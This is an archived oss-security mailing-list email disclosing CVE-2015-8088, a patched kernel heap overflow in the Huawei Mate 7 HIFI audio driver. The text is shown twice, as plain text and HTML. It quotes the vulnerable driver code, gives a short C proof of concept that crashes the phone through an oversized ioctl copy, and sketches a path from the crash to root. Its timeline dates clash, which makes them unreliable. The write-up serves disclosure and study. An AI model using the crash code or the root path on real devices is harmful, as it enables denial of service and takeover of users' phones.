X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["18693" "Saturday" "12" "December" "2015" "22:51:54" "+0800" "Pray3r" "pray3r.z@gmail.com" "<etPan.566c348a.736a8748.22f4@s3cur1ty-lab.local>" "567" "[oss-security] CVE-2015-8088: Heap Overflow Vulnerability in the HIFI Driver of Huawei Smart Phone" nil nil nil "12" "2015121214:51:54" "[oss-security] CVE-2015-8088: Heap Overflow Vulnerability in the HIFI Driver of Huawei Smart Phone" (number mark "U       pray3r.z@gma Dec 12  567/18693 " thread-indent "\"[oss-security] CVE-2015-8088: Heap Overflow Vulnerability in the HIFI Driver of Huawei Smart Phone\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 10165 invoked by uid 550); 12 Dec 2015 15:30:27 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 28372 invoked from network); 12 Dec 2015 14:52:17 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=date:from:to:message-id:subject:mime-version:content-type;
        bh=Fe4yNQyIqoJBwIy6F6M1+zA2NXj2RpU9w9PYqB6RSu4=;
        b=oUQWfrbk8IU19gkuk51UcUEx94u+7S3uArBPoUIH12UqhruiQIX0iBL1fhuXDJbfyp
         FVVl752nUaiW4xWXgjFl04KochRyVONmFFqbS7Dib8VsmFFoH+UKi0qz94gcb4fMOtRX
         bkeUU7PoWoHHH2QTq3RAh1NxcAvj0FsbvxBWS/6TAxnp6m5z4o6KNn4CpAZLZCJcVfM5
         MTZ7wPiut/u/CAXtimKBibgweBdFIL9YWkrNSLHUefokL6aK/2e8GZnRMytfSBLizkiP
         jPy1qAhn0XXHi/lSJjPyE1EG4sV4tK5irCRn/xIst40B6hiyAqyUni5os19L8u4cm7Lt
         wOMA==
X-Received: by 10.66.100.135 with SMTP id ey7mr33203729pab.108.1449931925347;
        Sat, 12 Dec 2015 06:52:05 -0800 (PST)
Date: Sat, 12 Dec 2015 22:51:54 +0800
From: Pray3r <pray3r.z@gmail.com>
To: oss-security@lists.openwall.com
Message-ID: <etPan.566c348a.736a8748.22f4@s3cur1ty-lab.local>
X-Mailer: Airmail (335)
MIME-Version: 1.0
Content-Type: multipart/signed;
 boundary="5EEB5C21-6515-4013-A356-60B5DA2FC761";
 protocol="application/pgp-signature"; micalg=pgp-sha512
Subject: [oss-security] CVE-2015-8088: Heap Overflow Vulnerability in the HIFI Driver
 of Huawei Smart Phone

--5EEB5C21-6515-4013-A356-60B5DA2FC761
Content-Type: multipart/alternative; boundary="566c348a_555a6da2_22f4"

--566c348a_555a6da2_22f4
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: inline

Hello everyone,
	One month ago, I was reported heap overflow vulnerability of Huawei smart =
phone(CVE-2015-8088) to Huawei PSIRT, but they didn=E2=80=99t disclosure th=
e detail of this vulnerability. So I=E2=80=99m sending the original version=
 of the vulnerability advisory to sos-sec mailing list just for record[1].
=09=09
[1].=C2=A0https://github.com/citypw/DNFWAH/raw/master/5/d5_0x03_DNFWAH_cve-=
2015-8088-heap-overflow-analysis.txt


|=3D-----------------------------------------------------------------=3D|
|=3D-----=3D[ D O   N O T   F U C K   W I T H   A   H A C K E R ]=3D-----=
=3D|
|=3D-----------------------------------------------------------------=3D|
|=3D------------------------[ #5 File 0x03 ]-------------------------=3D|
|=3D-----------------------------------------------------------------=3D|
|=3D-------=3D[ CVE-2015-8088: Heap Overflow Vulnerability ]=3D----------=
=3D|=20=20
|=3D--------=3D[ in the HIFI Driver of Huawei Smart Phone ]=3D-----------=
=3D|
|=3D-----------------------------------------------------------------=3D|
|=3D-----------------------=3D[ By Pray3r   ]=3D-------------------------=
=3D|
|=3D-----------------------------------------------------------------=3D|
|=3D-----------------------------------------------------------------=3D|
|=3D-----------------------=3D[ Dec 9 2015 ]=3D--------------------------=
=3D|
|=3D-----------------------------------------------------------------=3D|


--[ Content

 0x00. Summary

 0x01. Description

 0x02. Impact

 0x03. Affected

 0x04. Patch

 0x05. Timeline


--[ 0x00. Summary

  /dev/hifi_misc module of Huawei Mate 7 smart phone has an input
  check error, which allows the user-mode application to modify
  kernel-mode memory data and maybe make system break down or
  application elevate privilege.


--[ 0x01. Description

  /dev/hifi_misc is an interface for a user-mode application to
interact with kernel module of hisi chipset.  It is very likely that
hifi_misc is related with hifi audio features.  Seen from
drivers/hisi/hifidsp/hifi_lpp.c, one could send messages to hifi's
kernel module by invoking ioctl() with HIFI_MISC_IOCTL_WRITE_PARAMS:

< drivers/hisi/hifidsp/hifi_lpp.c >

static long hifi_misc_ioctl(struct file *fd, unsigned int cmd, unsigned lon=
g arg)
{
[...]
	switch(cmd) {
		[...]
		case HIFI_MISC_IOCTL_WRITE_PARAMS : /* write algo param to hifi*/
			ret =3D hifi_dsp_write_param(arg);
			break;
		[...]
	}
[...]
}

< / >

  After ioctl(), hifi_dsp_write_param() is called with the parameter
  directly passed from user-space:

< drivers/hisi/hifidsp/hifi_lpp.c >

int hifi_dsp_write_param(unsigned long arg)
{
	int ret =3D OK;
	phys_addr_t hifi_param_phy_addr =3D 0;
	void*	    			hifi_param_vir_addr =3D NULL;
	CARM_HIFI_DYN_ADDR_SHARE_STRU* hifi_addr =3D NULL;
	struct misc_io_sync_param para;
[...]
	if (copy_from_user(&para, (void*)arg, sizeof(struct misc_io_sync_param))) =
{  // arg --> para
	   loge("copy_from_user fail.\n");
	   ret =3D ERROR;
	   goto error1;
	}
[...]
	hifi_param_vir_addr =3D (unsigned char*)ioremap(hifi_param_phy_addr, SIZE_=
PARAM_PRIV); // heap alloc
	if (NULL =3D=3D hifi_param_vir_addr) {
	   loge("hifi_param_vir_addr ioremap fail\n");
	   ret =3D ERROR;
	   goto error2;
	}
[...]
	ret =3D copy_from_user(hifi_param_vir_addr, para.para_in, para.para_size_i=
n); // heap overflow
	if ( ret !=3D 0) {
	   loge("copy data to hifi error! ret =3D %d", ret);
	   }
[...]
}

< / >

  Parameter arg is a struct pointer points to user-space memory.
  After initialization of hifi_dsp_write_param(), user-space memory
  pointed by arg is copied to para via copy_from_user().  Without any
  verification, all the member variables of para is fully controlled
  by user-space application.  The struct of para:

struct misc_io_sync_param {
       void *              para_in;=20=20=20=20=20=20=20=20=20=20=20
       unsigned int        para_size_in;=20=20=20=20=20=20=20
       void *              para_out;=20=20=20=20=20=20=20=20=20=20=20
       unsigned int        para_size_out;=20=20=20
};

Next, a memory copy is invoked as copy_from_user(hifi_param_vir_addr,
  para.para_in, para.para_size_in)
=20=20
 1. hifi_param_vir_addr points to a kernel heap block allocated by
    ioremap(), regarded as the address of destination memory block.
    The size of the this heap block is SIZE_PARAM_PRIV (equals to 200
    * 1024) bytes.
=20=20
 2. para.para_in is a pointer controlled by user-space, regarded as
 the address of original memory block.

 3. para.para_size is an unsigned int controlled by user-space,
 regarded as the size of original memory block.
=20=20=20=20=20=20=20=20
  Since there are not any verification of para_size and para_in, if
  para.para_size is larger than 200*1024, say 300*1024, a typical heap
  overflow is triggered.  The source code of our poc:

< poc.c >
/*
 *
 *  HuaWei Mate7 hifi driver Poc
 *
 *  Writen by pray3r<pray3r.z@gmail.com>
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>

#define HIFI_MISC_IOCTL_WRITE_PARAMS    _IOWR('A', 0x75, struct misc_io_syn=
c_param)

struct misc_io_sync_param {
       void *                  para_in;=20=20=20=20=20=20=20=20=20=20=20=20
       unsigned int            para_size_in;=20=20=20=20=20=20=20=20
       void *                  para_out;=20=20=20=20=20=20=20=20=20=20=20=20
       unsigned int            para_size_out;=20=20=20=20
};

int main(int arg, char **argv)
{
	int fd;=20=20
	void *in =3D malloc(300 * 1024);
	void *out =3D malloc(100);
	struct misc_io_sync_param poc;

	poc.para_in =3D in;
	poc.para_size_in =3D 300 * 1024;
	poc.para_out =3D out;
	poc.para_size_out =3D 100;

	fd =3D open("/dev/hifi_misc", O_RDWR);

	ioctl(fd, HIFI_MISC_IOCTL_WRITE_PARAMS, &poc);

	free(in);
	free(out);

	return 0;
}

< / >

  Execute the crash_poc will break down Huawei Mate 7.  Be aware that
  the poc should be executed under system or audio privilege, since
  /dev/hifi_misc is only writable to audio and system user.


--[ 0x02. Impact=20=20

  First, with a large value set to para.para_size, the smart phone
  will break down because of heap overflow inside kernel space.
  Second, this vulnerability could be used as a kernel information
  disclosure if para.para_in points to kernel objects and the exploit
  is wrapped with heap fengshui technique.  Third, sophisticated
  exploitation methodology such as heap spray of thread_info published
  by Keen Team, an attacker could build a workable exploit gaining the
  root privilege of the smart phone.
=20=20
  Although /dev/hifi_misc is only writable to audio and system user,
  an attacker may approach the root privilege by first gaining audio
  or system privilege via other bugs or tricks then exploit this
  kernel vulnerability to gain root.

  Such two step exploitation methodology to gain root privilege of
  Huawei Mate 7 is something that Keen Team had utilized before:
=20=20
  1. http://www1.huawei.com/en/security/psirt/security-bulletins/security-a=
dvisories/hw-414174.htm

  2. http://forum.xda-developers.com/mate-7/general/wip-mate-7-root-bl-unlo=
ck-t2995086


--[ 0x03. Affected

  Model   : HUAWEI MT7-TL10
  Version : MT7-TL10V100R001CHNC00B133
  Android : 4.4.2
  Kernel  : 3.10.30-00015-g049a08f

  Other models of Huawei smart phones with hisi chipset may also be
  affected.


--[ 0x04. Patch

  More information:
  http://www1.huawei.com/en/security/psirt/security-bulletins/security-advi=
sories/hw-460347.htm


--[ 0x05. Timeline

 Sep 28 2015 - Report sent to Huawei PSIRT
 Sep 10 2015 - Huawei confirmed the security issues
 Nov 04 2015 - Huawei fixed and public the security issues
 Nov 09 2015 - Update CVE number

---=C2=A0
Security is a bitch!=

--566c348a_555a6da2_22f4
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: inline

<html><head><style>body{font-family:Helvetica,Arial;font-size:13px}</style>=
</head><body style=3D"word-wrap: break-word; -webkit-nbsp-mode: space; -web=
kit-line-break: after-white-space;"><div id=3D"bloop_customfont" style=3D"f=
ont-family:Helvetica,Arial;font-size:13px; color: rgba(0,0,0,1.0); margin: =
0px; line-height: auto;">Hello everyone,</div><div id=3D"bloop_customfont" =
style=3D"font-family:Helvetica,Arial;font-size:13px; color: rgba(0,0,0,1.0)=
; margin: 0px; line-height: auto;"><span class=3D"Apple-tab-span" style=3D"=
white-space:pre">	</span>One month ago, I was reported heap overflow vulner=
ability of Huawei smart phone(CVE-2015-8088) to Huawei PSIRT, but they didn=
=E2=80=99t disclosure the detail of this vulnerability. So I=E2=80=99m send=
ing the original version of the vulnerability advisory to sos-sec mailing l=
ist just for record[1].</div><div id=3D"bloop_customfont" style=3D"font-fam=
ily:Helvetica,Arial;font-size:13px; color: rgba(0,0,0,1.0); margin: 0px; li=
ne-height: auto;"><span class=3D"Apple-tab-span" style=3D"white-space:pre">=
	</span></div><div id=3D"bloop_customfont" style=3D"font-family:Helvetica,A=
rial;font-size:13px; color: rgba(0,0,0,1.0); margin: 0px; line-height: auto=
;">[1].&nbsp;<a href=3D"https://github.com/citypw/DNFWAH/raw/master/5/d5_0x=
03_DNFWAH_cve-2015-8088-heap-overflow-analysis.txt">https://github.com/city=
pw/DNFWAH/raw/master/5/d5_0x03_DNFWAH_cve-2015-8088-heap-overflow-analysis.=
txt</a></div><div id=3D"bloop_customfont" style=3D"font-family:Helvetica,Ar=
ial;font-size:13px; color: rgba(0,0,0,1.0); margin: 0px; line-height: auto;=
"><br></div><div id=3D"bloop_customfont" style=3D"font-family:Helvetica,Ari=
al;font-size:13px; color: rgba(0,0,0,1.0); margin: 0px; line-height: auto;"=
><pre style=3D"line-height: normal; widows: 1;">
|=3D-----------------------------------------------------------------=3D|
|=3D-----=3D[ D O   N O T   F U C K   W I T H   A   H A C K E R ]=3D-----=
=3D|
|=3D-----------------------------------------------------------------=3D|
|=3D------------------------[ #5 File 0x03 ]-------------------------=3D|
|=3D-----------------------------------------------------------------=3D|
|=3D-------=3D[ CVE-2015-8088: Heap Overflow Vulnerability ]=3D----------=
=3D|=20=20
|=3D--------=3D[ in the HIFI Driver of Huawei Smart Phone ]=3D-----------=
=3D|
|=3D-----------------------------------------------------------------=3D|
|=3D-----------------------=3D[ By Pray3r   ]=3D-------------------------=
=3D|
|=3D-----------------------------------------------------------------=3D|
|=3D-----------------------------------------------------------------=3D|
|=3D-----------------------=3D[ Dec 9 2015 ]=3D--------------------------=
=3D|
|=3D-----------------------------------------------------------------=3D|


--[ Content

 0x00. Summary

 0x01. Description

 0x02. Impact

 0x03. Affected

 0x04. Patch

 0x05. Timeline


--[ 0x00. Summary

  /dev/hifi_misc module of Huawei Mate 7 smart phone has an input
  check error, which allows the user-mode application to modify
  kernel-mode memory data and maybe make system break down or
  application elevate privilege.


--[ 0x01. Description

  /dev/hifi_misc is an interface for a user-mode application to
interact with kernel module of hisi chipset.  It is very likely that
hifi_misc is related with hifi audio features.  Seen from
drivers/hisi/hifidsp/hifi_lpp.c, one could send messages to hifi's
kernel module by invoking ioctl() with HIFI_MISC_IOCTL_WRITE_PARAMS:

&lt; drivers/hisi/hifidsp/hifi_lpp.c &gt;

static long hifi_misc_ioctl(struct file *fd, unsigned int cmd, unsigned lon=
g arg)
{
[...]
	switch(cmd) {
		[...]
		case HIFI_MISC_IOCTL_WRITE_PARAMS : /* write algo param to hifi*/
			ret =3D hifi_dsp_write_param(arg);
			break;
		[...]
	}
[...]
}

&lt; / &gt;

  After ioctl(), hifi_dsp_write_param() is called with the parameter
  directly passed from user-space:

&lt; drivers/hisi/hifidsp/hifi_lpp.c &gt;

int hifi_dsp_write_param(unsigned long arg)
{
	int ret =3D OK;
	phys_addr_t hifi_param_phy_addr =3D 0;
	void*	    			hifi_param_vir_addr =3D NULL;
	CARM_HIFI_DYN_ADDR_SHARE_STRU* hifi_addr =3D NULL;
	struct misc_io_sync_param para;
[...]
	if (copy_from_user(&amp;para, (void*)arg, sizeof(struct misc_io_sync_param=
))) {  // arg --&gt; para
	   loge("copy_from_user fail.\n");
	   ret =3D ERROR;
	   goto error1;
	}
[...]
	hifi_param_vir_addr =3D (unsigned char*)ioremap(hifi_param_phy_addr, SIZE_=
PARAM_PRIV); // heap alloc
	if (NULL =3D=3D hifi_param_vir_addr) {
	   loge("hifi_param_vir_addr ioremap fail\n");
	   ret =3D ERROR;
	   goto error2;
	}
[...]
	ret =3D copy_from_user(hifi_param_vir_addr, para.para_in, para.para_size_i=
n); // heap overflow
	if ( ret !=3D 0) {
	   loge("copy data to hifi error! ret =3D %d", ret);
	   }
[...]
}

&lt; / &gt;

  Parameter arg is a struct pointer points to user-space memory.
  After initialization of hifi_dsp_write_param(), user-space memory
  pointed by arg is copied to para via copy_from_user().  Without any
  verification, all the member variables of para is fully controlled
  by user-space application.  The struct of para:

struct misc_io_sync_param {
       void *              para_in;=20=20=20=20=20=20=20=20=20=20=20
       unsigned int        para_size_in;=20=20=20=20=20=20=20
       void *              para_out;=20=20=20=20=20=20=20=20=20=20=20
       unsigned int        para_size_out;=20=20=20
};

Next, a memory copy is invoked as copy_from_user(hifi_param_vir_addr,
  para.para_in, para.para_size_in)
=20=20
 1. hifi_param_vir_addr points to a kernel heap block allocated by
    ioremap(), regarded as the address of destination memory block.
    The size of the this heap block is SIZE_PARAM_PRIV (equals to 200
    * 1024) bytes.
=20=20
 2. para.para_in is a pointer controlled by user-space, regarded as
 the address of original memory block.

 3. para.para_size is an unsigned int controlled by user-space,
 regarded as the size of original memory block.
=20=20=20=20=20=20=20=20
  Since there are not any verification of para_size and para_in, if
  para.para_size is larger than 200*1024, say 300*1024, a typical heap
  overflow is triggered.  The source code of our poc:

&lt; poc.c &gt;
/*
 *
 *  HuaWei Mate7 hifi driver Poc
 *
 *  Writen by pray3r&lt;pray3r.z@gmail.com&gt;
 *
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/ioctl.h&gt;

#define HIFI_MISC_IOCTL_WRITE_PARAMS    _IOWR('A', 0x75, struct misc_io_syn=
c_param)

struct misc_io_sync_param {
       void *                  para_in;=20=20=20=20=20=20=20=20=20=20=20=20
       unsigned int            para_size_in;=20=20=20=20=20=20=20=20
       void *                  para_out;=20=20=20=20=20=20=20=20=20=20=20=20
       unsigned int            para_size_out;=20=20=20=20
};

int main(int arg, char **argv)
{
	int fd;=20=20
	void *in =3D malloc(300 * 1024);
	void *out =3D malloc(100);
	struct misc_io_sync_param poc;

	poc.para_in =3D in;
	poc.para_size_in =3D 300 * 1024;
	poc.para_out =3D out;
	poc.para_size_out =3D 100;

	fd =3D open("/dev/hifi_misc", O_RDWR);

	ioctl(fd, HIFI_MISC_IOCTL_WRITE_PARAMS, &amp;poc);

	free(in);
	free(out);

	return 0;
}

&lt; / &gt;

  Execute the crash_poc will break down Huawei Mate 7.  Be aware that
  the poc should be executed under system or audio privilege, since
  /dev/hifi_misc is only writable to audio and system user.


--[ 0x02. Impact=20=20

  First, with a large value set to para.para_size, the smart phone
  will break down because of heap overflow inside kernel space.
  Second, this vulnerability could be used as a kernel information
  disclosure if para.para_in points to kernel objects and the exploit
  is wrapped with heap fengshui technique.  Third, sophisticated
  exploitation methodology such as heap spray of thread_info published
  by Keen Team, an attacker could build a workable exploit gaining the
  root privilege of the smart phone.
=20=20
  Although /dev/hifi_misc is only writable to audio and system user,
  an attacker may approach the root privilege by first gaining audio
  or system privilege via other bugs or tricks then exploit this
  kernel vulnerability to gain root.

  Such two step exploitation methodology to gain root privilege of
  Huawei Mate 7 is something that Keen Team had utilized before:
=20=20
  1. http://www1.huawei.com/en/security/psirt/security-bulletins/security-a=
dvisories/hw-414174.htm

  2. http://forum.xda-developers.com/mate-7/general/wip-mate-7-root-bl-unlo=
ck-t2995086


--[ 0x03. Affected

  Model   : HUAWEI MT7-TL10
  Version : MT7-TL10V100R001CHNC00B133
  Android : 4.4.2
  Kernel  : 3.10.30-00015-g049a08f

  Other models of Huawei smart phones with hisi chipset may also be
  affected.


--[ 0x04. Patch

  More information:
  http://www1.huawei.com/en/security/psirt/security-bulletins/security-advi=
sories/hw-460347.htm


--[ 0x05. Timeline

 Sep 28 2015 - Report sent to Huawei PSIRT
 Sep 10 2015 - Huawei confirmed the security issues
 Nov 04 2015 - Huawei fixed and public the security issues
 Nov 09 2015 - Update CVE number</pre></div><br><div id=3D"bloop_sign_14499=
30522156931840" class=3D"bloop_sign"><div style=3D"font-family:helvetica,ar=
ial;font-size:13px">---&nbsp;<br>Security is a bitch!</div></div></body></h=
tml>=

--566c348a_555a6da2_22f4--

--5EEB5C21-6515-4013-A356-60B5DA2FC761
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename=signature.asc
Content-Type: application/pgp-signature; name=signature.asc
Content-Description: Message signed with OpenPGP using AMPGpg

-----BEGIN PGP SIGNATURE-----
Comment: GPGTools - https://gpgtools.org

iQIcBAEBCgAGBQJWbDSPAAoJEM+cWi9WgY1e4eQP/3OW7o+IEhPxcCBWG132KtBP
gcWEZROftxD+mM4IBo2yBLuyEXy6AGUAq7X3Y/ado17ptNHY2tjeP8ripRVoTOIU
9FmfUkXXKyRp+EtQVIl1e0YFCXuICelUATlxh43XbSDza9te8UgpMA5YcwflYn5H
vKN22gvCv99JvCemH+ZGRFHLYSJzMbhNRUaKJxpkwN5xacWRsKtWkq/ZFVR486mk
WH1+2JttRzvQR5nwxNHbxYH+4pQqVK11MXPUr094Zp08uNFd27X6f8t5GxGICvWV
gtHolu3CRo+IOLWhjOpRFlP3aUlAUBdkBVfIQvYuhGltx8HRKcjVM4JpfAvpCJdm
SnvKMSKWvqxTZ4KKLpeUdbfzkdasoP8l2byqgnGrhfrVvQiESvBrcAx1UNXriCg4
PkN1fo6g1XTwZHlbea1ZNI/O0Tla2Tv81hZFN1MyM92zxWPExCOebFlYdkL0fvws
Z9CNNJ0fvHHJLSGwIi7VdHyo59PgPaINPwjZe5n8IR7XXUiN3C5FoSxqxmjevxCw
RNb/Aqwyw1admWH07dztxwPiCNQKvdsJJvnp+30sLcCI75oIPXV4khspbj/H9zs1
JRL7yX5D0OyXJyIh+nFjnzLCwZrc1S6P2ou/q+JHRWf+Me2P2KHZVtNpT5y5AvaJ
+1gKnhmouG46XeV1k30Y
-----END PGP SIGNATURE-----

--5EEB5C21-6515-4013-A356-60B5DA2FC761--
